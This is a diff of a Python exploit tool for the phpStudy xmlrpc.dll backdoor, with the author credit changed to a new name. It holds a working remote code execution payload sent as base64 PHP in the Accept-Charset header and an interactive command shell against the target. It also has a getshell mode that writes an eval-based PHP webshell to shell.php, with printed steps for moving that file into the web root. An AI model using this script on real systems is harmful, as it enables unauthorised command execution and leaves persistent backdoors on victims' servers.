@@ -1,7 +1,7 @@
 # coding:utf-8
-# Author:Writeup001
+# Author:yongz
 # Description:phpstudy 2016/2018 xmlrpc.dll backdoor rce
-# Date:2019_10_28
+# Date:2023-2-19
 
 
 
@@ -13,11 +13,11 @@ import threading
 import datetime
 
 headers = {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11',
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
-        'Accept-Encoding': 'gzip,deflate',
-        'Accept-Language': 'zh-CN,zh;q=0.9',
-    }
+    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
+    'Accept-Encoding': 'gzip,deflate',
+    'Accept-Language': 'zh-CN,zh;q=0.9',
+}
 
 
 lock = threading.Lock()
@@ -30,21 +30,17 @@ succ = 0
 def checkPhpstudyBackdoor(tgtUrl,timeout):
 
     headers['Accept-Charset'] = 'ZXhpdCgnV3JpN2VUaDNXMHJsZCcpOw=='
-    # exit('Wri7eTh3W0rld');
-    # 无特定含义的字符串
+    # ZXhpdCgnV3JpN2VUaDNXMHJsZCcpOw==  ->  exit('Wri7eTh3W0rld'); 无意义字符串判断是否执行成功。
 
     rsp = requests.get(tgtUrl,headers=headers,verify=False,timeout=timeout)
-    # verify=False移除SSL认证
-    
+    # verify=False 移除 SSL 认证
+
     rsp.encoding='utf-8'
-    # print(rsp.text)
 
     if "Wri7eTh3W0rld" in rsp.text:
         return True
-        # print('Target is vulnerable!!!' + '\n')
     else:
         return False
-        # print('Target is not vulnerable.' + '\n')
 
 
 def checkPhpstudyBackdoorBatch(timeout, doorSuccess):
@@ -80,7 +76,6 @@ def checkPhpstudyBackdoorBatch(timeout, doorSuccess):
 
 
 def getCmdShellPhpstudyBackdoor(tgtUrl,timeout):
-    #pass
 
     while True:
         command = input("cmd>>> ")
@@ -88,64 +83,60 @@ def getCmdShellPhpstudyBackdoor(tgtUrl,timeout):
             break
 
         command = "system(\"" + command + "\");"
-        #system("whoami");
         command.encode('utf-8')
         command = base64.b64encode(command.encode('utf-8'))
         headers['Accept-Charset'] = command
         cmdResult = requests.get(tgtUrl, headers=headers, verify=False,timeout=7)
-        
+
         cmdResult.encoding='gbk'
         #因为 phpStudy 只有 Windows 版存在漏洞，Windows 系统使用的是 GBK 编码。
-        #只读取<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "DTD/xhtml1-transitional.dtd">之前文件信息
+
         if cmdResult.text.split('<!')[0] == '':
             print('Command Error!')
         else:
             print (cmdResult.text.split('<!')[0])
-        
+
 
 
 def phpstudyBackdoorGetshell(tgtUrl,timeout):
 
-    
-    print ('Using current web path:WWW' + '\n')
-    #headers['Accept-Charset'] = 'c3lzdGVtKCcgRUNITyBePD9waHAgQGV2YWwoJF9QT1NUW2NtZF0pOyA/Xj4+Ii4vZGVtb24ucGhwICcpOw=='
-    #system(' ECHO ^<?php @eval($_POST[cmd]); ?^>>"./demon.php ');
-    # 写一个一句话木马写入进 phpinfo.php 文件
-    b64exp = "system(' ECHO ^<?php @eval($_GET[cmd]); ?^> >> ./phpStudyBackDoor.php');"
+    # 将一句话木马写入进 phpinfo.php 文件
+    b64exp = "system(' ECHO ^<?php @eval($_REQUEST[cmd]); ?^> >> ./shell.php');"
     b64exp = base64.b64encode(b64exp.encode('utf-8'))
     headers['Accept-Charset'] = b64exp
 
     rsp = requests.get(tgtUrl,headers=headers,verify=False,timeout=timeout)
 
-    #print rsp.text.encode('utf-8')
-
+    # 写入成功执行如下命令
     if rsp.status_code == 200:
-        backDoorUrl = tgtUrl + '/phpStudyBackDoor.php'
-        print(backDoorUrl)
+        # 发送请求访问 shell.php 文件
+        backDoorUrl = tgtUrl + '/shell.php'
         rsp1 = requests.get(backDoorUrl,verify=False,timeout=timeout)
-        print(rsp1.text)
-        if (rsp1.status_code == 200):
+        b64poc = "system('dir');"
+        b64poc = base64.b64encode(b64poc.encode('utf-8'))
+        headers['Accept-Charset'] = b64poc
 
-            #return True
-            print ('Getshell successed!!!\n' + 'Shell addr:' + backDoorUrl + '\n')
-            print('Please test:' + backDoorUrl + '?cmd=phpinfo();' )
+        rsp2 = requests.get(tgtUrl,headers=headers,verify=False,timeout=timeout)
+        rsp2.encoding='gbk'
+        # 如果存在 shell.php 文件则说明木马写入成功，之所以这么判断是因为文件上传路径无法确定，原先脚本就是访问不到文件显示 404，这里进行了一些改进
+        if "shell.php" in rsp2.text:
+            print ('shell.php 创建成功！\n\n请使用 --cmd 查看文件路径并将后门文件迁移至 WWW 目录下\n')
+            print ('命令如下：\nchdir        # 查看目录路径\ncopy shell.php xxxx/WWW        # 迁移文件')
         else:
-            #return False
-            print ('Getshell failed. \n'+'Maybe the file directory does not have permissions.')
-            print('You can try to change the file directory.\n')
+            print ('shell.php 创建失败！')
     else:
-        print ('Something Error!')
-
-
+        print ('Request Error!')
 
 
 if __name__ == '__main__':
     print ('''
-		********************************
-		*     phpStudy BackDoor RCE    * 
-		*       Coded by Writeup       * 
-		********************************
-		''')
+        _          ____  _             _         ____             _    ____                     ____   ____ _____ 
+  _ __ | |__  _ __/ ___|| |_ _   _  __| |_   _  | __ )  __ _  ___| | _|  _ \  ___   ___  _ __  |  _ \ / ___| ____|
+ | '_ \| '_ \| '_ \___ \| __| | | |/ _` | | | | |  _ \ / _` |/ __| |/ / | | |/ _ \ / _ \| '__| | |_) | |   |  _|  
+ | |_) | | | | |_) |__) | |_| |_| | (_| | |_| | | |_) | (_| | (__|   <| |_| | (_) | (_) | |    |  _ <| |___| |___ 
+ | .__/|_| |_| .__/____/ \__|\__,_|\__,_|\__, | |____/ \__,_|\___|_|\_\____/ \___/ \___/|_|    |_| \_\\____|_____|
+ |_|         |_|                         |___/       by yongz                                                             
+        ''')
     #创建一个OPtionParser 对象
     parser = optparse.OptionParser('python %prog ' + '-h (manual)', version='%prog v1.0')
 
@@ -155,8 +146,8 @@ if __name__ == '__main__':
     parser.add_option('-s', dest='timeout', type='int', default=7, help='timeout(seconds)')
     parser.add_option('-t', dest='threads', type='int', default=5, help='the number of threads')
 
-    parser.add_option('--getshell', dest='getshell',action='store_true', help='get webshell')
-    parser.add_option('--cmdshell', dest='cmdshell',action='store_true', help='cmd shell mode')
+    parser.add_option('--get', dest='getshell',action='store_true', help='get webshell')
+    parser.add_option('--cmd', dest='cmdshell',action='store_true', help='cmd shell mode')
 
 
     #解析传入的命令行参数
@@ -168,15 +159,15 @@ if __name__ == '__main__':
     getshell = options.getshell
     cmdshell = options.cmdshell
 
-    
+
     # python phpStudyBackDoor.py -u "http://192.168.80.128"
     if tgtUrl and (cmdshell is None) and (getshell is None):
         if(checkPhpstudyBackdoor(tgtUrl,timeout)):
             print ('Target is vulnerable!!!' + '\n')
         else:
             print ('Target is not vulnerable.' + '\n')
-    
-    # python phpStudyBackDoor.py -u "http://192.168.80.128" --cmdshell
+
+    # python phpStudyBackDoor.py -u "http://192.168.80.128" --cmd
     if tgtUrl and cmdshell and (getshell is None):
         if (checkPhpstudyBackdoor(tgtUrl,timeout)):
             print ('Target is vulnerable!!! Entering cmdshell...' + '\n')
@@ -184,11 +175,8 @@ if __name__ == '__main__':
         else:
             print ('Target is not vulnerable.' + '\n')
             pass
-            
 
-        
-
-    # python phpStudyBackDoor.py -u "http://192.168.80.128" --getshell
+    # python phpStudyBackDoor.py -u "http://192.168.80.128" --get
     if tgtUrl and (cmdshell is None) and getshell:
         phpstudyBackdoorGetshell(tgtUrl,timeout)
 
